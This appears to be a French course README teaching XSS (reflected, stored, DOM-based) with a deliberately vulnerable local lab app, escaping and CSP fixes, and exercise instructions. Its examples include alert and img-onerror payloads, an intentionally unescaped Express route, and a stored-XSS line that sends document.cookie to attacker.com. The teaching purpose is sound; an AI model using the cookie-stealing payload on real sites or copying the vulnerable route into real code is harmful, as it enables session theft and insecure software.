# Room 4 - XSS (Cross-Site Scripting)

## Objectif de la room

Cette room vous apprend à comprendre et prévenir les attaques XSS, l'une des vulnérabilités les plus courantes sur le web.

À la fin de cette room, vous serez capable de :
- Comprendre ce qu'est le XSS et ses différentes formes
- Identifier du code vulnérable au XSS
- Échapper et sanitizer les entrées utilisateur
- Implémenter une Content Security Policy (CSP) de base

## Scénario narratif

Vous développez une application de blog où les utilisateurs peuvent laisser des commentaires. Les commentaires sont affichés directement sur la page. Votre collègue vous montre le code et vous avez un mauvais pressentiment...

Votre mission : comprendre la vulnérabilité XSS, voir comment elle peut être exploitée, et implémenter une version sécurisée.

## Qu'est-ce que le XSS ?

**XSS (Cross-Site Scripting)** est une vulnérabilité qui permet à un attaquant d'injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs. Le nom "Cross-Site" peut prêter à confusion : le code s'exécute sur le site ciblé, pas sur un autre site. Le terme vient du fait que l'attaquant injecte du code depuis un site externe.

**Pourquoi c'est dangereux** : Le JavaScript injecté s'exécute dans le contexte du site web légitime, avec les mêmes privilèges que le JavaScript légitime. Cela permet de voler des cookies de session, modifier le contenu de la page, rediriger vers des sites malveillants, ou voler des données saisies par l'utilisateur.

### Types de XSS

#### 1. XSS Réfléchi (Reflected XSS)

Le code malveillant est **reflété immédiatement** dans la réponse HTTP, souvent via les paramètres d'URL, les champs de formulaire, ou les headers HTTP. Il n'est pas stocké sur le serveur.

**Caractéristiques** :
- Le code malveillant apparaît dans l'URL ou les paramètres de la requête
- Il est immédiatement inclus dans la réponse HTML sans échappement
- Il nécessite que la victime clique sur un lien malveillant ou soumette un formulaire

**Exemple** :
```
URL : http://site.com/search?q=<script>alert('XSS')</script>
Réponse HTML : <div>Résultats pour <script>alert('XSS')</script></div>
```

**Scénario d'attaque** :
1. L'attaquant crée un lien malveillant avec du JavaScript dans l'URL
2. L'attaquant envoie ce lien à la victime (email, message, etc.)
3. La victime clique sur le lien
4. Le site reflète le JavaScript dans la page
5. Le JavaScript s'exécute dans le navigateur de la victime

#### 2. XSS Stocké (Stored XSS ou Persistent XSS)

Le code malveillant est **stocké dans la base de données** (ou un autre stockage persistant) et exécuté à chaque fois que la page est chargée. C'est le type de XSS le plus dangereux car il affecte tous les utilisateurs qui voient le contenu stocké.

**Caractéristiques** :
- Le code malveillant est stocké de manière permanente
- Il s'exécute automatiquement pour tous les utilisateurs qui voient le contenu
- Il ne nécessite pas que la victime clique sur un lien spécifique

**Exemple** :
```
Commentaire posté : "Super article ! <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
Chaque fois qu'un utilisateur voit ce commentaire, le script s'exécute et vole son cookie de session.
```

**Scénario d'attaque** :
1. L'attaquant poste un commentaire contenant du JavaScript malveillant
2. Le commentaire est stocké dans la base de données
3. Tous les utilisateurs qui voient ce commentaire exécutent automatiquement le script
4. Le script vole les cookies de session ou effectue d'autres actions malveillantes

#### 3. XSS basé sur le DOM (DOM-based XSS)

Le code malveillant modifie le **DOM directement via JavaScript côté client**, sans que le code malveillant ne soit présent dans le HTML initial envoyé par le serveur. La vulnérabilité se trouve dans le code JavaScript côté client qui manipule le DOM de manière non sécurisée.

**Caractéristiques** :
- Le code malveillant n'apparaît pas dans le HTML initial
- Il est injecté via manipulation JavaScript du DOM
- Il peut être déclenché par des fragments d'URL (hash), des paramètres, ou d'autres sources

**Exemple** :
```javascript
// Code vulnérable côté client
document.getElementById('message').innerHTML = location.hash.substring(1);
// Si l'URL est : http://site.com/#<img src=x onerror=alert('XSS')>
// Le code s'exécute
```

**Scénario d'attaque** :
1. L'attaquant crée un lien avec du JavaScript dans le hash de l'URL
2. La victime clique sur le lien
3. Le JavaScript côté client lit le hash et l'insère dans le DOM sans échappement
4. Le JavaScript malveillant s'exécute

## Démarrage

**Windows (PowerShell)** :
```powershell
# Depuis le dossier racine du projet (Cybersecu_Ensitech)
cd room-4-xss
docker-compose up -d
```

**Mac (Terminal)** :
```bash
# Depuis le dossier racine du projet (Cybersecu_Ensitech)
cd room-4-xss
docker-compose up -d
```

**Où exécuter** : Depuis le dossier racine du projet (`Cybersecu_Ensitech`)

Application vulnérable : `http://localhost:3004`
Application sécurisée : `http://localhost:3005`

## Analyse du code vulnérable

### Problème principal : Affichage non échappé

```javascript
// VULNÉRABLE
app.get('/comment', (req, res) => {
    const comment = req.query.comment;
    res.send(`<div>${comment}</div>`); // Injection directe !
});
```

**Impact** : Un attaquant peut injecter du JavaScript qui s'exécutera dans le navigateur des autres utilisateurs.

## Version sécurisée

### Solution 1 : Échappement HTML

```javascript
// SÉCURISÉ
const escapeHtml = (text) => {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
};

res.send(`<div>${escapeHtml(comment)}</div>`);
```

### Solution 2 : Utiliser un template engine sécurisé

Les frameworks modernes (React, Vue, etc.) échappent automatiquement par défaut.

### Solution 3 : Content Security Policy (CSP)

```javascript
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "default-src 'self'");
    next();
});
```

## Ressources pédagogiques

### Ordre recommandé de consultation

Pour tirer le meilleur parti de cette room, suivez cet ordre :

1. **Lisez ce README** pour comprendre les différents types de XSS
2. **Lancez l'application vulnérable** et testez des injections XSS pour voir comment elles fonctionnent
3. **Analysez le code vulnérable** pour identifier les problèmes
4. **Réalisez l'exercice** dans `/exercises/` pour implémenter l'échappement
5. **Comparez avec la version sécurisée** pour voir les bonnes pratiques
6. **Vérifiez votre implémentation** avec la checklist de sécurité

### Exercices guidés

L'exercice vous guide pour sécuriser le code :

- **[Exercice 1 : Échapper les données utilisateur](./exercises/exercise-1.md)** - Implémenter une fonction d'échappement HTML et l'utiliser pour sécuriser l'affichage

**Conseil** : Testez d'abord les injections XSS sur l'application vulnérable pour bien comprendre le problème. Consultez la solution dans `/SOLUTIONS/room-4/` uniquement après avoir tenté de résoudre par vous-même.

### Checklist de sécurité

Utilisez la **[checklist de sécurité complète](./checklists/security-checklist.md)** pour vérifier que votre code est protégé contre le XSS. Cette checklist couvre :

- Échappement des données utilisateur (HTML, JavaScript, CSS, URL)
- Validation des entrées (complémentaire à l'échappement)
- Content Security Policy (CSP) comme couche de défense supplémentaire
- Bonnes pratiques (éviter innerHTML, eval, etc.)

**Conseil** : Utilisez cette checklist comme référence lors du développement de vos propres applications.

## Erreurs fréquentes

- Penser que la validation suffit (la validation ne protège pas contre XSS)
- Oublier d'échapper dans certains contextes (HTML, JavaScript, CSS, URL)
- Désactiver l'échappement "parce que ça casse le design"

## Comment partager vos réponses et votre code

Pour partager votre fonction d'échappement, c'est très simple :

### Méthode simple : Créer une Issue GitHub

1. Allez sur la page GitHub du dépôt
2. Cliquez sur **"Issues"** puis **"New Issue"**
3. Dans le **titre**, écrivez : `[Room 4] Fonction escapeHtml - Votre nom`
4. Dans le **corps**, collez directement votre code

**C'est tout !** Collez simplement votre code dans l'issue.

### Format simple pour partager

Copiez-collez ce format :

````
# Mes réponses - Room 4

## Ma fonction escapeHtml() :

```javascript
// Collez ici votre fonction escapeHtml()
function escapeHtml(text) {
    // Votre code ici
}
```

## Tests que j'ai effectués :
- `<script>alert('XSS')</script>` : [Décrivez ce qui s'est passé]
- `<img src=x onerror=alert('XSS')>` : [Décrivez ce qui s'est passé]

## Comment j'utilise la fonction :
```javascript
// Montrez comment vous utilisez escapeHtml() dans votre code
```
````

### Si vous avez des questions

Créez une issue avec le titre : `[Question] Room 4 - Votre question`

Expliquez :
- Ce que vous essayez de faire
- Le problème que vous rencontrez
- Ce que vous avez déjà essayé

## Prochaines étapes

Une fois que vous maîtrisez le XSS, vous êtes prêt pour la **Room 5 - Sécuriser une API**.

